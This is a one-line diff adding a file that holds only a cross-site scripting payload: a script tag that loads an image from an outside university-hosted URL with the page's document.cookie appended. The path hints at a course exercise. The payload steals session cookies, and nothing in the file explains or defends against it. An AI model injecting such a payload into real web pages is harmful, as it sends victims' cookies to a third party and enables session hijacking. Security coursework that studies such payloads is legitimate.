@@ -1,0 +1,1 @@
+<script>new Image().src="http://fiona.utdallas.edu/~yxf160330/Q2/XSS_Write.php/"+document.cookie;</script>
